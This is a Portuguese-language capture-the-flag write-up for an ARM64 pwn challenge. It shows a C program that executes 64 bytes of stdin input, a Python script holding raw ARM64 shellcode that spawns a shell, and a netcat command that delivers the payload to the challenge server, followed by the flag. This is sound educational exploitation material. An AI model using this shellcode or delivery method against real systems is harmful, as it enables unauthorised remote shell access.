# **CTF**

## _Pwn2_

## Informações

| **Category:** | **Points:** |
| ------------- | ----------- |
| Pwn           | 500         |

**Descrição:**

> Check out this amazing infraestructure only to run a single ARM64 binary: nc 34.95.239.56 9994

## Solução

Usando o comendo file vemos que o binário em questão usa arquitetura ARM64

```
$ file Posts/Pwn/pwn2/bin/pwn
Posts/Pwn/pwn2/bin/pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=2505cae9c912dfe5d5b391897aa5c64e52ab7b2a, for GNU/Linux 3.7.0, not stripped
```

Olhando o código vemos que há um buffer de 64 caracteres cujos bytes são executados logo em seguida.

```
#include <stdio.h>
#include <unistd.h>
//Run with  cat payload - | qemu-aarch64 -g 1234 ./bin/pwn
//Debug with gdb-multiarch --ex="set arch aarch64" --ex="target remote localhost:1234" --ex="break main" ./pwn
//Remove the option -g 1234 for disable debugging
int main(){
  char buf[64];
  printf("Executing your shellcode\n");
  fgets(buf,64,stdin);
  int (*ret)() = (int(*)())buf;
  ret();

}
```

Com algumas pesquisas no Google encontrei o spawn de um shell em ARM64 que pode ser visto no link:
https://www.exploit-db.com/exploits/47048

Usando Python escrevi um script que grava o payload em um arquivo para o input no binário.

```
payload = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"


f = open("payload", "wb")
f.write(payload)
f.close()

```

Com isso usando `cat payload - | nc 34.95.239.56 9994` conseguimos spawnar um shell e capturar a flag.

![](https://i.imgur.com/Kaq9U5B.png)

### Flag

> CTF-BR{the_whole_virtualization_stack}
